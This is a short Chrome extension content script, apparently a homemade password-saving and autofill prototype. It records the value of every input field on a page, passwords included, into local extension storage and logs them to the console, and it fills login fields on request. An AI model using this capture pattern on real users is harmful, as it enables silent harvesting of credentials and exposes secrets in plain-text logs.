// you will see this log in console log of current tab in Chrome when the script is injected
console.log("content_script.js");

let inputs = {};
function getIndexFromSet(set, elm) {
    var setArr = [].slice.call(set);
    for (var i in setArr) if (setArr[i] == elm) return i;
}

function inputChangeCallBack(event) {
    const _inputs = document.getElementsByTagName("input");
    index = getIndexFromSet(_inputs, event.target);
    inputs[index] = event.target.value;
    chrome.storage.local.set({ 'creditentals': inputs }, function () {
        console.log(inputs);
    });
}
// listen to input changes
document.addEventListener("input", inputChangeCallBack, true);

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    var inputs = document.getElementsByTagName("input");
    inputs[0].value = request.username;
    inputs[1].value = request.password;
    inputs[0].style.backgroundColor = "yellow";
    inputs[1].style.backgroundColor = "yellow";
});

